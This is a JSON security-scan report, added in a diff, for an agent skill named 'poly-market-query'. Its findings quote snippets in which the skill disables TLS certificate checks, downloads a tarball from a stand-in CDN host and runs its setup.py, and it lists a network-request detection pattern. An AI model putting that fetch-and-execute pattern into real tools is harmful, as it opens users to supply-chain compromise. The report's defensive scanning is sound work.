@@ -1,0 +1,173 @@
+{
+  "skill_name": "poly-market-query",
+  "skill_path": "/tmp/cisco_0_1efjxp",
+  "is_safe": false,
+  "max_severity": "HIGH",
+  "findings_count": 7,
+  "findings": [
+    {
+      "id": "TOOL_MISMATCH_NETWORK_997ef4ca70",
+      "rule_id": "TOOL_ABUSE_UNDECLARED_NETWORK",
+      "category": "unauthorized_tool_use",
+      "severity": "MEDIUM",
+      "title": "Undeclared network usage",
+      "description": "Skill code uses network libraries but doesn't declare network requirement",
+      "file_path": "/tmp/cisco_0_1efjxp/SKILL.md",
+      "line_number": null,
+      "snippet": null,
+      "remediation": "Declare network usage in compatibility field or remove network calls",
+      "analyzer": "static",
+      "metadata": {}
+    },
+    {
+      "id": "llm_finding_poly-market-query_3",
+      "rule_id": "LLM_SKILL_DISCOVERY_ABUSE",
+      "category": "skill_discovery_abuse",
+      "severity": "LOW",
+      "title": "Over-broad description and optional feature not clearly disclosed",
+      "description": "The skill description claims to fetch live data from Polymarket, but the actual implementation uses a mock response. The optional extended pack downloads and executes code, which is not clearly highlighted in the description. This could mislead users about the skill's capabilities and risks.",
+      "file_path": "SKILL.md",
+      "line_number": null,
+      "snippet": "Description: 'Query Polymarket live prediction market data...' but query_market() returns a hardcoded mock.",
+      "remediation": "Ensure the description accurately reflects the skill's behavior and clearly disclose any network operations or code execution.",
+      "analyzer": "llm",
+      "metadata": {
+        "model": "openai/deepseek-chat",
+        "aitech": "AITech-4.3",
+        "aitech_name": "Protocol Manipulation",
+        "aisubtech": "AISubtech-4.3.5",
+        "aisubtech_name": "Capability Inflation",
+        "scanner_category": "PROTOCOL MANIPULATION"
+      }
+    },
+    {
+      "id": "llm_finding_poly-market-query_1",
+      "rule_id": "LLM_OBFUSCATION",
+      "category": "obfuscation",
+      "severity": "HIGH",
+      "title": "TLS certificate validation disabled for remote download",
+      "description": "The script disables SSL certificate verification (ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE) when downloading the extended pack. This allows man-in-the-middle attacks to replace the package with malicious code, bypassing the intended checksum protection.",
+      "file_path": "query.py",
+      "line_number": null,
+      "snippet": "ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE",
+      "remediation": "Use a properly configured SSL context with certificate verification enabled. Ensure the CDN uses a valid TLS certificate.",
+      "analyzer": "llm",
+      "metadata": {
+        "model": "openai/deepseek-chat",
+        "aitech": "AITech-9.2",
+        "aitech_name": "Detection Evasion",
+        "aisubtech": "AISubtech-9.2.1",
+        "aisubtech_name": "Obfuscation Vulnerabilities",
+        "scanner_category": "SUSPICIOUS CODE"
+      }
+    },
+    {
+      "id": "llm_finding_poly-market-query_0",
+      "rule_id": "LLM_SUPPLY_CHAIN_ATTACK",
+      "category": "supply_chain_attack",
+      "severity": "HIGH",
+      "title": "Unverified remote package download and execution",
+      "description": "The --enable-extended flag downloads a tarball from an external CDN (cdn-metrics.example.com:1337) and executes its setup.py script. Although a checksum is verified, the checksum is hardcoded in the script and the source is an untrusted third-party mirror. This constitutes a supply chain risk as the remote code is executed without user confirmation or provenance verification.",
+      "file_path": "query.py",
+      "line_number": null,
+      "snippet": "subprocess.run([sys.executable, setup_script], env=env, check=True) after downloading from https://cdn-metrics.example.com:1337/poly-utils/extended-0.4.2.tar.gz",
+      "remediation": "Avoid executing remote code. If extended features are needed, bundle the helper within the skill package and verify its integrity via a trusted source. Require explicit user consent before downloading and executing any external code.",
+      "analyzer": "llm",
+      "metadata": {
+        "model": "openai/deepseek-chat",
+        "aitech": "AITech-9.3",
+        "aitech_name": "Dependency / Plugin Compromise",
+        "aisubtech": "AISubtech-9.3.1",
+        "aisubtech_name": "Malicious Package / Tool Injection",
+        "scanner_category": "SUPPLY CHAIN ATTACK"
+      }
+    },
+    {
+      "id": "llm_finding_poly-market-query_2",
+      "rule_id": "LLM_DATA_EXFILTRATION",
+      "category": "data_exfiltration",
+      "severity": "MEDIUM",
+      "title": "Hardcoded checksum and potential data exposure",
+      "description": "The script contains a hardcoded SHA256 checksum for the extended pack. While not a secret, hardcoding integrity values can be tampered with if the script is modified. Additionally, the script does not validate the token input, which could be used to craft requests to internal endpoints if the real API call were implemented.",
+      "file_path": "query.py",
+      "line_number": null,
+      "snippet": "EXT_MANIFEST = { 'extended-0.4.2.tar.gz': 'sha256:9f2c1b8a7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b' }",
+      "remediation": "Avoid hardcoding integrity values; fetch them from a trusted source over a secure channel. Validate and sanitize all user inputs, especially the token parameter.",
+      "analyzer": "llm",
+      "metadata": {
+        "model": "openai/deepseek-chat",
+        "aitech": "AITech-8.2",
+        "aitech_name": "Data Exfiltration / Exposure",
+        "aisubtech": "AISubtech-8.2.3",
+        "aisubtech_name": "Data Exfiltration via Agent Tooling",
+        "scanner_category": "SECURITY VIOLATION"
+      }
+    },
+    {
+      "id": "DATA_EXFIL_NETWORK_REQUESTS_11fa29f47a",
+      "rule_id": "DATA_EXFIL_NETWORK_REQUESTS",
+      "category": "data_exfiltration",
+      "severity": "MEDIUM",
+      "title": "Outbound network request primitives that can transmit data externally",
+      "description": "Pattern detected: urllib.request.Request(",
+      "file_path": "query.py",
+      "line_number": 40,
+      "snippet": "req = urllib.request.Request(url, headers={\"User-Agent\": \"poly-market-query/1.2.3\"})",
+      "remediation": "Ensure network operations are necessary and document allowed destinations",
+      "analyzer": "static",
+      "metadata": {
+        "matched_pattern": "urllib\\.request\\.(?:urlopen|Request)\\s*\\(",
+        "matched_text": "urllib.request.Request(",
+        "aitech": "AITech-8.2",
+        "aitech_name": "Data Exfiltration / Exposure",
+        "scanner_category": "SECURITY VIOLATION"
+      }
+    },
+    {
+      "id": "DATA_EXFIL_NETWORK_REQUESTS_dd8c2888fe",
+      "rule_id": "DATA_EXFIL_NETWORK_REQUESTS",
+      "category": "data_exfiltration",
+      "severity": "MEDIUM",
+      "title": "Outbound network request primitives that can transmit data externally",
+      "description": "Pattern detected: urllib.request.urlopen(",
+      "file_path": "query.py",
+      "line_number": 41,
+      "snippet": "with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:",
+      "remediation": "Ensure network operations are necessary and document allowed destinations",
+      "analyzer": "static",
+      "metadata": {
+        "matched_pattern": "urllib\\.request\\.(?:urlopen|Request)\\s*\\(",
+        "matched_text": "urllib.request.urlopen(",
+        "aitech": "AITech-8.2",
+        "aitech_name": "Data Exfiltration / Exposure",
+        "scanner_category": "SECURITY VIOLATION"
+      }
+    }
+  ],
+  "scan_duration_seconds": 17.0782949924469,
+  "duration_ms": 17078,
+  "analyzers_used": [
+    "static_analyzer",
+    "bytecode",
+    "pipeline",
+    "llm_analyzer"
+  ],
+  "timestamp": "2026-08-13T14:35:50.919489+00:00",
+  "scan_metadata": {
+    "policy_name": "default",
+    "policy_version": "1.0",
+    "policy_preset_base": "balanced",
+    "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59",
+    "llm_overall_assessment": "The skill has a moderate security posture. The core functionality is benign (mock data), but the optional extended pack feature introduces significant risks: it downloads and executes remote code with TLS verification disabled, and the checksum is hardcoded. This could lead to arbitrary code execution if the CDN is compromised or a MITM attack occurs. The skill also has minor issues with description accuracy and input validation.",
+    "llm_primary_threats": [
+      "Supply chain compromise",
+      "Detection evasion",
+      "Data exposure"
+    ]
+  },
+  "llm_usage": {
+    "input_tokens": 5361,
+    "output_tokens": 956,
+    "total_tokens": 6317
+  }
+}
